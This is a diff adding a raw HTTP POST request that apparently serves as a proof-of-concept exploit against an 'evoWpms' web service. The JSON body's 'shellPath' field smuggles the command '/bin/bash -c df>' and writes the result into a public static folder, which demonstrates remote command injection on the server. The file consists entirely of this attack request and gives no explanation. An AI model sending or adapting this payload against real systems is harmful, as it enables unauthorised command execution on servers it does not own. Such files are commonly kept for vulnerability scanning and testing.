@@ -1,0 +1,21 @@
+POST /evo-runs/v1.0/receive HTTP/1.1
+Host: 
+Accept-Encoding: gzip
+Connection: keep-alive
+Content-Length: 249
+Content-Type: application/json
+User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36
+X-Subject-Headerflag: ADAPT
+
+{
+  "method": "agent.ossm.mapping.config",
+  "info": {
+    "configure": "abcd",
+    "filePath": "haha",
+    "paramMap": {
+      "shellPath": "/bin/bash -c df>/opt/evoWpms/static/macvguun.txt",
+      "filePath": "abc"
+    },
+    "requestIp": ""
+  }
+}
